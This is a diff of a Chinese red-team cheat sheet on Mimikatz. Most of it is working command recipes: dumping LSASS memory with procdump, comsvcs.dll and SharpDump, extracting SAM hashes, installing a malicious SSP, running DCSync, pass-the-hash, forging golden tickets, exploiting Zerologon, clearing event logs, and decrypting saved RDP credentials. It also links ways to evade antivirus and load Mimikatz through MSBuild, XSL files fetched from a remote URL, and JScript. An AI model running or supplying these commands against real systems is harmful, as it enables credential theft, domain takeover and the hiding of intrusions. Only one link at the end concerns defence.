@@ -19,6 +19,47 @@
 - [九种姿势运行 Mimikatz](https://www.freebuf.com/articles/web/176796.html)
 - [Mimikatz 使用小技巧](https://www.webshell.cc/5343.html)
 - [域渗透——Dump Clear-Text Password after KB2871997 installed](https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Dump%20Clear-Text%20Password%20after%20KB2871997%20installed.html)
+- [【红蓝对抗】内网渗透-免杀抓取windows hash](https://mp.weixin.qq.com/s/WLP1soWz-_BEouMxTHLbzg)
+- [Mimikatz的18种免杀姿势及防御策略(上)](https://mp.weixin.qq.com/s/CiOaMnJBcEQfZXV_hopzLw)
+- [Mimikatz的18种免杀姿势及防御策略(下)](https://mp.weixin.qq.com/s/0p88rj-tWClLa_geKMkPgw)
+- [防御Mimikatz攻击的方法介绍](https://www.freebuf.com/articles/network/180869.html)
+- [获取Windows高版本明文密码](https://mp.weixin.qq.com/s/Q-JBDdt6jPi9fawlGAiHzg)
+- [红队技巧：绕过ESET_NOD32抓取密码](https://mp.weixin.qq.com/s/FaiNEUX2wcscotkyAqUO2Q)
+- [Exploring Mimikatz - Part 1 - WDigest](https://blog.xpnsec.com/exploring-mimikatz-part-1/)
+    - [Mimikatz中sekurlsa::wdigest的实现](https://3gstudent.github.io/3gstudent.github.io/Mimikatz%E4%B8%ADsekurlsa-wdigest%E7%9A%84%E5%AE%9E%E7%8E%B0/)
+- [Exploring Mimikatz - Part 2 - SSP](https://blog.xpnsec.com/exploring-mimikatz-part-2/)
+    - [深入分析Mimikatz：SSP](https://www.anquanke.com/post/id/180001)
+- [《MiniDumpWriteDump via COM+ Services DLL》的利用测试](https://3gstudent.github.io/3gstudent.github.io/MiniDumpWriteDump-via-COM+-Services-DLL-%E7%9A%84%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/)
+- [Extract credentials from lsass remotely](https://en.hackndo.com/remote-lsass-dump-passwords/)
+- [缓解Mimikatz风格攻击](https://xz.aliyun.com/t/4180)
+
+**辅助项目**
+- [skelsec/pypykatz](https://github.com/skelsec/pypykatz) - 纯 Python 的 Mimikatz 实现,Runs on all OS's which support python>=3.6
+    ```
+    pypykatz lsa minidump lsass.dmp
+    ```
+- [3gstudent/msbuild-inline-task](https://github.com/3gstudent/msbuild-inline-task) - 利用 MSBuild 执行 Mimikatz
+    ```
+    cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319
+    .\MSBuild.exe 1.xml
+    ```
+- [Stealthbits/poshkatz](https://github.com/Stealthbits/poshkatz) - PowerShell module for Mimikatz
+- [vyrus001/go-mimikatz](https://github.com/vyrus001/go-mimikatz)
+- JScript
+    - [Instructions-to-mimikatz-js.txt](https://gist.github.com/pljoel/42dae5e56a86a43612bea6961cb59d1a) - JS 加载 Mimikatz
+        ```
+        cscript mimikatz.js
+        ```
+    - [xsl版](https://github.com/TideSec/BypassAntiVirus/blob/master/tools/mimikatz/mimikatz.xsl)
+        ```
+        wmic os get /format:"mimikatz.xsl"
+        wmic os get /FORMAT:"https://example.com/mimikatz.xsl"
+        ```
+    - [sct版](https://github.com/TideSec/BypassAntiVirus/blob/master/tools/mimikatz/mimikatz.sct)
+- html
+    - [Hacking the World with HTML](https://osandamalith.com/2020/07/19/hacking-the-world-with-html/)
+    - [OsandaMalith/PE2HTML](https://github.com/OsandaMalith/PE2HTML)
+- [Hackndo/lsassy](https://github.com/Hackndo/lsassy)
 
 ---
 
@@ -26,12 +67,17 @@
 
 提权
 ```bash
-privilege::debug
+privilege::debug    # 获取调试权限
 ```
 
 抓取密码
 ```bash
 sekurlsa::logonpasswords
+```
+
+如果你没有访问 lsass 进程的权限，那你就抓不到密码, 报错如下
+```
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
 ```
 
 输出
@@ -41,6 +87,162 @@ mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && 
 mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt
 # 输出到 log.txt
 ```
+
+**parameter -patch**
+```
+privilege::debug
+lsadump::lsa /patch
+```
+
+**Token Elevation**
+
+获得 MachineAccount 口令 hash
+```
+privilege::debug
+token::elevate
+lsadump::secrets
+```
+
+输出
+```bash
+mimikatz.exe ""privilege::debug"" ""token::elevate"" ""lsadump::secrets"" exit >> log.txt
+```
+
+**MSCACHE**
+```
+privilege::debug
+lsadump::cache
+```
+
+---
+
+# 离线抓取
+
+**相关文章**
+- [Win10及2012系统以后的明文抓取方式](https://www.anquanke.com/post/id/175364)
+- [Mimikatz明文密码抓取](https://uknowsec.cn/posts/notes/Mimikatz%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96.html)
+- [mimikatz-抓取windows明文密码](http://rtshield.top/2019/09/02/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-mimikatz-%E6%8A%93%E5%8F%96windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81/)
+- [利用Mimikatz提取虚拟机内存中的密码](https://www.freebuf.com/articles/system/44620.html)
+- [LSASS Memory Dumps are Stealthier than Ever Before](https://www.deepinstinct.com/2021/01/24/lsass-memory-dumps-are-stealthier-than-ever-before/)
+- [Lsass Memory Dumps are Stealthier than Ever Before – Part 2](https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/)
+- [渗透技巧——使用Mimilib从dump文件中导出口令](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BD%BF%E7%94%A8Mimilib%E4%BB%8Edump%E6%96%87%E4%BB%B6%E4%B8%AD%E5%AF%BC%E5%87%BA%E5%8F%A3%E4%BB%A4/)
+
+**直接转储**
+
+在任务管理器找到 lsass.exe，右键创建转储文件
+
+procdump 是微软的官方工具，不会被杀，所以如果你的 mimikatz 不免杀，可以用 procdump 导出 lsass.dmp 后拖回本地抓取密码来规避杀软。
+```bash
+Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+
+也可以采用 pid 方式规避杀软
+```
+tasklist /fi "imagename eq lsass.exe"
+procdump -accepteula -ma 640 lsass.dmp
+
+```
+
+然后用 mimikatz 加载导出来的内存再抓 hash
+```bash
+sekurlsa::minidump c:\users\test\appdata\local\temp\lsass.dmp
+sekurlsa::logonpasswords full
+```
+
+**comsvcs.dll**
+
+使用 `C:\windows\system32\comsvcs.dll` 的导出函数 MiniDump 能够 dump 指定进程的内存文件
+
+在 dump 指定进程内存文件时，需要开启 SeDebugPrivilege 权限, 管理员权限的 cmd 下，默认支持 SeDebugPrivilege 权限，但是状态为 Disabled
+
+直接在 cmd 下执行 rundll32 的命令尝试 dump 指定进程内存文件时，由于无法开启 SeDebugPrivilege 权限，所以会失败, 管理员权限的 powershell 下，默认支持 SeDebugPrivilege 权限，并且状态为 Enabled
+
+所以可以通过 powershell 执行 rundll32 的命令实现
+
+```powershell
+Get-Process lsass
+powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 516 C:\lsass.dmp full"
+```
+
+**[SharpDump](https://github.com/GhostPack/SharpDump)** c# 免杀抓明文
+
+在管理员权限下运行生成 debug480.bin
+
+特别注意,dump 的文件默认是 bin 后缀,拖到本地机器以后,需要自行把 bin 重命名为 zip 的后缀,然后正常解压出里面的文件,再丢给 mimikatz 去读取即可,如下
+
+mimikatz 加载 dump 文件
+```bash
+sekurlsa::minidump debug480
+sekurlsa::logonPasswords full
+```
+
+还有一些工具
+- SqlDumper
+    ```bash
+    tasklist /svc | findstr lsass.exe  # 查看lsass.exe 的PID号
+    # 或powershell 下
+    Get-Process lsass
+
+    Sqldumper.exe ProcessID 0 0x01100  # 导出mdmp文件
+    ```
+
+**sam + mimikatz**
+
+> 注意：本地复原机器必须与目标机器一致，且需要在系统权限下执行
+
+从 sam 中提取目标系统用户 hash
+```bash
+reg save HKLM\SYSTEM system.hiv
+reg save HKLM\SAM sam.hiv
+reg save HKLM\SECURITY security.hiv
+```
+
+将上述三个文件复制到攻击机本地，然后使用 mimikatz 获取用户 hash
+```bash
+lsadump::sam /system:system.hiv /sam:sam.hiv /security:security.hiv
+```
+
+**windbg 中载入 mimilib 模块**
+
+可通过 notmyfault 强制蓝屏
+- https://docs.microsoft.com/en-us/sysinternals/downloads/notmyfault
+    ```
+    notmyfault64.exe -accepteula /crash
+    ````
+
+    ![](../../../assets/img/Security/安全工具/mimikatz/16.png)
+
+在 windbg 中载入 dmp 文件
+
+![](../../../assets/img/Security/安全工具/mimikatz/5.png)
+
+![](../../../assets/img/Security/安全工具/mimikatz/6.png)
+
+运行. symfix，然后执行. reload
+
+![](../../../assets/img/Security/安全工具/mimikatz/7.png)
+
+windbg 中载入 mimilib 模块
+
+![](../../../assets/img/Security/安全工具/mimikatz/8.png)
+
+查找 lsass 进程
+
+![](../../../assets/img/Security/安全工具/mimikatz/9.png)
+
+将镜像 lsass 环境转换到本机中
+
+![](../../../assets/img/Security/安全工具/mimikatz/10.png)
+
+载入 mimikatz
+
+![](../../../assets/img/Security/安全工具/mimikatz/11.png)
+
+**WerFault.exe**
+
+- [deepinstinct/LsassSilentProcessExit](https://github.com/deepinstinct/LsassSilentProcessExit)
+
+**远程传输**
 
 输出传输到远程机器
 ```bash
@@ -62,16 +264,11 @@ nc.exe -vv 192.168.1.2 443 -e mimikatz.exe
 # 192.168.1.2 为 Victim IP
 ```
 
-若管理员有每过几天就改密码的习惯,但是 mimikatz 抓取到的密码都是老密码,用 QuarksPwDump 等抓的 hash 也是老 hash,新密码却抓不到的情况下
-```bash
-privilege::debug
-misc::memssp
-```
-记录的结果在 `c:/windows/system32/mimilsa.log`
-
 ---
 
 # 无法抓取 windows 明文密码的解决方法
+
+## 改注册表
 
 在 KB2871997 之前， Mimikatz 可以直接抓取明文密码。
 
@@ -150,86 +347,26 @@ misc::memssp
 
     重新读取，可读到明文密码。
 
----
+## ssp
 
-# 离线抓取
+mimikatz 包含的 SSP 提供自动记录本地验证凭证的功能。这包括计算机账户密码、运行服务凭证和任何登录的账户。默认情况下，这些数据会被记录在与 dll 文件相同的位置上，但也可以在系统的其他地方记录这些数据。如果 Windows 系统是一个提供认证用户访问权限的域控制器，那么备用的日志位置可以在 SYSVOL 中。
 
-**文章**
-- [Win10及2012系统以后的明文抓取方式](https://www.anquanke.com/post/id/175364)
-- [Mimikatz明文密码抓取](https://uknowsec.cn/posts/notes/Mimikatz%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96.html)
-- [mimikatz-抓取windows明文密码](http://rtshield.top/2019/09/02/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-mimikatz-%E6%8A%93%E5%8F%96windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81/)
-- [利用Mimikatz提取虚拟机内存中的密码](https://www.freebuf.com/articles/system/44620.html)
-
-**直接转储**
-
-在任务管理器找到 lsass.exe，右键创建转储文件
-
-procdump 是微软的官方工具，不会被杀，所以如果你的 mimikatz 不免杀，可以用 procdump 导出 lsass.dmp 后拖回本地抓取密码来规避杀软。
 ```bash
-Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+privilege::debug
+misc::memssp
+```
+记录的结果在 `c:/windows/system32/mimilsa.log`
+
+## dll
+
+在 mimikatz 中有 32 和 64 两个版本，安装包里分别都带有不同位数的 mimilib.dll, 将对应版本的 dll 文件复制到 c:\windows\system32 下
+
+将注册表中 Security Packages 的值设置为 mimilib.dll
+```
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d mimilib.dll /f
 ```
 
-然后用 mimikatz 加载导出来的内存再抓 hash
-```bash
-sekurlsa::minidump c:\users\test\appdata\local\temp\lsass.dmp
-sekurlsa::logonpasswords full
-```
-
-**[SharpDump](https://github.com/GhostPack/SharpDump)** c# 免杀抓明文
-
-在管理员权限下运行生成 debug480.bin
-
-特别注意,dump 的文件默认是 bin 后缀,拖到本地机器以后,需要自行把 bin 重命名为 zip 的后缀,然后正常解压处里面的文件,再丢给 mimikatz 去读取即可,如下
-
-mimikatz 加载 dump 文件
-```bash
-sekurlsa::minidump debug480
-sekurlsa::logonPasswords full
-```
-
-**sam + mimikatz**
-
-> 注意：本地复原机器必须与目标机器一致，且需要在系统权限下执行
-
-从 sam 中提取目标系统用户 hash
-```bash
-reg save HKLM\SYSTEM system.hiv
-reg save HKLM\SAM sam.hiv
-reg save HKLM\SECURITY security.hiv
-```
-
-将上述三个文件复制到攻击机本地，然后使用 mimikatz 获取用户 hash
-```bash
-lsadump::sam /system:system.hiv /sam:sam.hiv /security:security.hiv
-```
-
-**windbg 中载入 mimilib 模块**
-
-在 windbg 中载入 dmp 文件
-
-![](../../../assets/img/Security/安全工具/mimikatz/5.png)
-
-![](../../../assets/img/Security/安全工具/mimikatz/6.png)
-
-运行. symfix，然后执行. reload
-
-![](../../../assets/img/Security/安全工具/mimikatz/7.png)
-
-windbg 中载入 mimilib 模块
-
-![](../../../assets/img/Security/安全工具/mimikatz/8.png)
-
-查找 lsass 进程
-
-![](../../../assets/img/Security/安全工具/mimikatz/9.png)
-
-将镜像 lsass 环境转换到本机中
-
-![](../../../assets/img/Security/安全工具/mimikatz/10.png)
-
-载入 mimikatz
-
-![](../../../assets/img/Security/安全工具/mimikatz/11.png)
+等待系统重启后，在 c:\windows\system32 生成文件 kiwissp.log，记录当前用户的明文口令
 
 ---
 
@@ -243,9 +380,15 @@ sekurlsa::minidump c:\temp\lsass.dmp      使用 Mimikatz 转储 LSASS 内存
 sekurlsa::logonpasswords
 ```
 
-**DCSync**
+## DCSync
 
-Mimikatz 有一个功能（dcsync），利用目录复制服务（DRS）从 NTDS.DIT 文件中检索密码哈希值。该技术消除了直接从域控制器进行认证的必要性，因为它可以从域管理员环境中属于域的任意系统执行。
+Mimikatz 有一个功能（dcsync），利用目录复制服务（DRS）从 NTDS.DIT 文件中检索密码哈希值。
+
+DCSync 是 mimikatz 在 2015 年添加的一个功能，由 Benjamin DELPY gentilkiwi 和 Vincent LE TOUX 共同编写，能够用来导出域内所有用户的 hash
+
+利用 DRS(Directory Replication Service) 协议通过 IDL_DRSGetNCChanges 从域控制器复制用户凭据
+
+该技术消除了直接从域控制器进行认证的必要性，因为它可以从域管理员环境中属于域的任意系统执行。
 
 运行 DCSync 需要特殊权限。管理员，域管理员或企业管理员以及域控制器计算机帐户的任何成员都能够运行 DCSync 来提取密码数据。请注意，只读域控制器不仅可以默认为用户提取密码数据。
 ```bash
@@ -265,11 +408,55 @@ privilege::debug
 lsadump::lsa /inject
 ```
 
+**特权用户下**
+```
+runas /noprofile /user:test@ffffffff0x.com cmd
+mimikatz.exe privilege::debug "lsadump::dcsync /domain:ffffffff0x.com /all /csv" exit
+```
+
 ---
 
 # PTH
 
 在对 Windows 系统进行渗透测试过程中，如果获取目标机器的系统权限，则可以通过 hashdump 的方式获取目标机器历史登录信息，包括用户名和用户明文密码或者用户 hash，如果无法直接获取目标用户明文密码，则可以通过 pth 的方式远程登录目标机器
+
+**相关文章**
+- [mimikatz-pth with rdp](http://rtshield.top/2019/08/31/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-mimikatz-pth_with_rdp/)
+- https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth
+- [Passing the hash with native RDP client (mstsc.exe)](https://edermi.github.io/post/2018/native_rdp_pass_the_hash/)
+- [攻击3389之PTH](https://mp.weixin.qq.com/s/mVSc5geSYwncpOda1OT-0g)
+
+**mimikatz 进行 PtH**
+
+1. (工作组)通过 pth 进行远程登录(cmd)
+    ```bash
+    mimikatz.exe privilege::debug
+
+    mimikatz.exe privilege::debug "sekurlsa::pth /user:用户名  /domain:目标机器IP  /ntlm:密码哈希"
+
+    mimikatz.exe privilege::debug "sekurlsa::pth /user:win10 /domain:192.168.1.1 /ntlm:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+
+    net use \\192.168.1.1\c$
+    dir \\192.168.1.1\c$
+    ```
+
+2. (域)通过 pth 进行远程登录(cmd)
+    ```bash
+    mimikatz.exe privilege::debug
+    mimikatz.exe sekurlsa::logonpasswords
+
+    mimikatz.exe privilege::debug "sekurlsa::pth /domain:目标机器的域 /user:目标机器的用户名 /ntlm:用户名对应的hash"
+
+    mimikatz.exe privilege::debug "sekurlsa::pth /user:win10 /domain:test.com /ntlm:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+    ```
+
+3. 通过 pth 进行远程登录(mstsc)
+    ```bash
+    # 管理员权限下执行以下命令:
+    mimikatz.exe privilege::debug "sekurlsa::pth /domain:目标机器的域 /user:目标机器的用户名 /ntlm:用户名对应的hash /run:mstsc.exe /restrictedadmin"
+    ```
+
+    RDP 限制管理模式是建立在 Kerberos 基础上的。看一下网络流量，可以看到 RDP 客户端代表模拟的用户请求 ticket，这没有问题，因为我们只需要通过哈希来验证 Kerberos。
 
 **受限管理模式**
 
@@ -314,40 +501,6 @@ lsadump::lsa /inject
     REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
     ```
 
-**mimikatz 进行 PtH**
-
-1. (工作组)通过 pth 进行远程登录(cmd)
-    ```bash
-    mimikatz.exe privilege::debug
-
-    mimikatz.exe privilege::debug "sekurlsa::pth /user:用户名  /domain:目标机器IP  /ntlm:密码哈希"
-
-    mimikatz.exe privilege::debug "sekurlsa::pth /user:win10 /domain:192.168.1.1 /ntlm:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
-    ```
-
-2. (域)通过 pth 进行远程登录(cmd)
-    ```bash
-    mimikatz.exe privilege::debug
-    mimikatz.exe sekurlsa::logonpasswords
-
-    mimikatz.exe privilege::debug "sekurlsa::pth /domain:目标机器的域 /user:目标机器的用户名 /ntlm:用户名对应的hash"
-
-    mimikatz.exe privilege::debug "sekurlsa::pth /user:win10 /domain:test.com /ntlm:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
-    ```
-
-3. 通过 pth 进行远程登录(mstsc)
-    ```bash
-    # 管理员权限下执行以下命令:
-    mimikatz.exe privilege::debug "sekurlsa::pth /domain:目标机器的域 /user:目标机器的用户名 /ntlm:用户名对应的hash /run:mstsc.exe /restrictedadmin"
-    ```
-
-    RDP 限制管理模式是建立在 Kerberos 基础上的。看一下网络流量，可以看到 RDP 客户端代表模拟的用户请求 ticket，这没有问题，因为我们只需要通过哈希来验证 Kerberos。
-
-**相关文章**
-- [mimikatz-pth with rdp](http://rtshield.top/2019/08/31/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-mimikatz-pth_with_rdp/)
-- https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth
-- [Passing the hash with native RDP client (mstsc.exe)](https://edermi.github.io/post/2018/native_rdp_pass_the_hash/)
-
 ---
 
 # PTT
@@ -384,6 +537,22 @@ kerberos::golden /domain:ffffffff0x.com /sid:S-1-5-21-1112871890-2494343973-3486
 访问测试
 
 ![](../../../assets/img/Security/安全工具/mimikatz/2.png)
+
+**例子:DCSync**
+
+有 LDAP 特权情况下，可以实现 DCSync
+
+```bash
+mimikatz "kerberos::golden /domain:<域名> /sid:<域 SID> /target:<目标服务器主机名> /service:LDAP /rc4:<NTLM Hash> /user:krbtgt /ptt" "lsadump::dcsync /domain:test.com /all /csv" exit
+```
+- 只能在域内计算机上运行，不支持域外
+- /sid 表示域的 sid, 任一域用户的 sid 去除最后一位就是域的 sid
+- /rc4 表示计算机帐户的 NTLM hash
+- /user:krbtgt 表示伪造成用户 krbtgt，生成票据
+
+```
+mimikatz "kerberos::golden /domain:ffffffff0x.com /sid:S-1-5-21-1112871890-2494343973-3486175548 /target:WIN-A5GPDCPJ7OT.ffffffff0x.com /service:LDAP /rc4:b0924e2e9d84ba0679c59f3730e91400 /user:krbtgt /ptt" "lsadump::dcsync /domain:ffffffff0x.com /all /csv" exit
+```
 
 ---
 
@@ -462,3 +631,92 @@ mimikatz "privilege::debug" "sekurlsa::pth /user:test /domain:test.com /aes256:c
 ```
 
 域控未打 KB2871997 补丁前，无法使用 Key 传递攻击
+
+---
+
+# zerologon
+
+```bash
+# 检测
+lsadump::zerologon /target:WIN-A5GPDCPJ7OT.ffffffff0x.com /account:WIN-A5GPDCPJ7OT$
+
+# 利用
+lsadump::zerologon /target:WIN-A5GPDCPJ7OT.ffffffff0x.com /account:WIN-A5GPDCPJ7OT$ /exploit
+
+# 使用空密码登录域管
+lsadump::dcsync /domain:ffffffff0x.com /dc:WIN-A5GPDCPJ7OT.ffffffff0x.com /user:krbtgt /authuser:WIN-A5GPDCPJ7OT$ /authdomain:ffffffff0x /authpassword:"" /authntlm
+
+# 导出hash
+lsadump::dcsync /domain:ffffffff0x.com /dc:WIN-A5GPDCPJ7OT.ffffffff0x.com /user:administrator /authuser:WIN-A5GPDCPJ7OT$ /authdomain:ffffffff0x /authpassword: /authntlm
+
+# 恢复密码
+lsadump::postzerologon /target:192.168.141.154 /account:WIN-A5GPDCPJ7OT$
+```
+
+---
+
+# 后渗透
+
+多用户登录 3389
+```
+ts::multirdp
+```
+
+清除日志
+```
+event::drop
+```
+
+粘贴板信息
+```
+misc::clip
+```
+
+---
+
+# DPAPI
+
+通过读取 Lsass 进程信息，获取当前系统中的 MasterKey，能获得多个 Master Key file 对应的 MasterKey
+```
+privilege::debug
+sekurlsa::dpapi
+```
+
+**RDP**
+
+Windows 保存 RDP 凭据的目录是 `C:\Users\用户名\AppData\Local\Microsoft\Credentials`
+
+![](../../../assets/img/Security/安全工具/mimikatz/12.png)
+
+可通过命令行获取，执行: `cmdkey /list` 或 `powerpick Get-ChildItem C:\Users\用户名\AppData\Local\Microsoft\Credentials\ -Force`
+
+注意: `cmdkey /list` 命令务必在 Session 会话下执行，system 下执行无结果。
+
+mimikatz 获取 guidMasterKey,再通过 guid 来找到其所对应的 Masterkey
+```
+privilege::debug
+dpapi::cred /in:C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\SESSIONID
+```
+
+![](../../../assets/img/Security/安全工具/mimikatz/13.png)
+
+pbData 是我们要解密的数据，guidMasterKey 是解密所需要的密钥,找到对应的 Masterkey 才能解密
+
+根据上面的 guidMasterKey 来确定其对应的 MasterKey, 如下所示
+```
+sekurlsa::dpapi
+```
+
+![](../../../assets/img/Security/安全工具/mimikatz/14.png)
+
+```
+dpapi::cred /in:C:\Users\USERNAME\Desktop\test\SESSIONID /masterkey:对应GUID的masterkey"
+```
+
+![](../../../assets/img/Security/安全工具/mimikatz/15.png)
+
+---
+
+# 防御手段
+
+- [Secure-Win](../../Integrated/Windows/Secure-Win.md#防御密码抓取)
